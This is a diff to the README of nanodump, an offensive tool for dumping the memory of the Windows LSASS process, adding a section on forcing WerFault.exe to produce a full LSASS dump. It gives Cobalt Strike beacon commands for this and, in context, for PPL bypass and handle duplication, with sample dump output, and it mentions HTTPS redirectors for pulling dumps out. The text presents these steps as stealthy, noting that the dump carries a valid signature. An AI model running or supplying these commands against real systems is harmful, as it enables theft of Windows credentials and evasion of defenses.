@@ -16,6 +16,7 @@ A flexible tool that creates a minidump of the LSASS process.
   <li><a href="#malseclogon-and-duplicate">MalSecLogon and handle duplication</a></li>
   <li><a href="#ssp">Load nanodump as an SSP</a></li>
   <li><a href="#ppl">PPL bypass</a></li>
+  <li><a href="#wer">WerFault</a></li>
   <li><a href="#params">Parameters</a></li>
   <li><a href="#examples">Examples</a></li>
   <li><a href="#redirectors">HTTPS redirectors</a></li>
@@ -160,8 +161,29 @@ To access this feature, use the `nanodump_ppl` command
 beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
 ```
 
+<h2 id="wer">10. WerFault</h2>
+You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires to write to the registry
 
-<h2 id="params">10. Parameters</h2>
+Because the dump is not made by nanodump, it will always have a valid signature.
+
+To access this feature, use the `--werfault` parameter and the path there the dump should be created.
+```
+beacon> nanodump --werfault C:\Windows\Temp\
+```
+
+A dump of the nanodump process will also be created, similar to this:
+```
+PS C:\> dir 'C:\Windows\Temp\lsass.exe-(PID-648)-4035593\'
+
+Directory: C:\Windows\Temp\lsass.exe-(PID-648)-4035593
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         6/23/2022   7:40 AM       58830409 lsass.exe-(PID-648).dmp
+-a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp
+```
+
+<h2 id="params">11. Parameters</h2>
 
 #### --getpid
 Get PID of LSASS and leave.  
@@ -194,8 +216,10 @@ Leak a handle to LSASS using MalSecLogon.
 Path to a binary such as `C:\Windows\notepad.exe`.  
 This option is used exclusively with `--malseclogon` and `--dup`. 
 
+#### --werfault -wf < folder >
+Path to the folder where the WerFault process will create an LSASS dump.  
 
-<h2 id="examples">11. Examples</h2>
+<h2 id="examples">12. Examples</h2>
 
 Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
 ```
@@ -243,7 +267,12 @@ Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:
 beacon> nanodump_ppl --dup --write C:\Windows\Temp\lsass.dmp
 ```
 
-<h2 id="redirectors">12. HTTPS redirectors</h2>
+Make the WerFault.exe process create a full memory dump in the Temp folder:
+```
+beacon> nanodump --werfault C:\Windows\Temp\
+```
+
+<h2 id="redirectors">13. HTTPS redirectors</h2>
 
 If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
 Increase the max size of requests on your web server to allow nanodump to download the dump.
@@ -272,3 +301,4 @@ location ~ ^...$ {
 - [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
 - [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
 - [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
+- [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2)
